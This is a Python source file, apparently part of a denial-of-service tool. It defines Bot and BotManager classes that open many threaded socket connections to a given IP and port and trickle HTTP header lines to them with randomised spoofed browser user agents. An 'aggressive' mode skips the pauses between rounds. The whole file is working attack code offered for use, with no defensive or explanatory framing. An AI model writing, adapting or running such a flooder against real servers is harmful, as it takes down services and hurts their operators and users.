# Date: 01/07/2019
# Author: Mohamed
# Description: Bot

import socket 
from time import sleep 
from queue import Queue 
from threading import Thread
from random import randint, choice 
from string import ascii_lowercase
from lib.const import header, max_threads


class Useragent:

    @staticmethod
    def get_win_version():
        versions = []
        version = 4.0
        while version <= 10:
            versions.append(version)
            version = round(version+0.1, 2)
        return choice(versions)
  
    @staticmethod 
    def get_chrome_version():
        a = randint(40, 69)
        b = randint(2987, 3497)
        c = randint(80, 140)
        return '{}.0.{}.{}'.format(a, b, c)

    @classmethod
    def get(cls):
        a = 'Mozilla/5.0 (Windows NT {}; Win64; x64)'.format(cls.get_win_version())
        b = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(cls.get_chrome_version())
        return '{} {}'.format(a, b)


class Bot:

    def __init__(self, ip, port, is_aggressive):
        self.ip = ip 
        self.port = port
        self.is_alive = True 
        self.is_aggressive = is_aggressive

    def sleep(self):
        for _ in range(randint(5, 10)):
            if self.is_alive:
                sleep(1)
        
    def start(self):
        self.sleep()
        while self.is_alive:
            session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            session.settimeout(10)
                                
            try:
                packet = self.header.decode().split('\n')
                session.connect((self.ip, self.port))
                is_success = True

                for _ in range(len(packet)-2):
                    data = packet[_] + '\n'

                    if _ == len(packet)-3:
                        data += '\r\n'
                    
                    try:
                        session.sendall(data.encode())
                        sleep(0.1)
                    except:
                        is_success = False 
                        break 
                
                if not self.is_aggressive and is_success:
                    self.sleep() 
                
            except:
                pass
                                       
    def stop(self):
        self.is_alive = False

    @property 
    def header(self):
        return header.format(self.text, Useragent.get()).encode()  

    @property 
    def text(self):
        printables = ascii_lowercase + ''.join([str(_) for _ in range(10)])
        return ''.join([choice(printables) for _ in range(randint(3, 9))])


class BotManager:

    def __init__(self, ip, port, threads, is_aggressive):
        self.ip = ip 
        self.port = port 
        self.bots = Queue()
        self.is_alive = True 
        self.is_aggressive = is_aggressive
        self.threads = threads if threads < max_threads else max_threads
                
    def start(self):        
        for _ in range(self.threads):

            if not self.is_alive:
                break 

            bot = Bot(self.ip, self.port, self.is_aggressive)
            self.bots.put(bot)

            try:
                Thread(target=bot.start, daemon=True).start() 
            except:
                break 
    
    def stop(self):
        self.is_alive = False 

        while self.bots.qsize():
            self.bots.get().stop()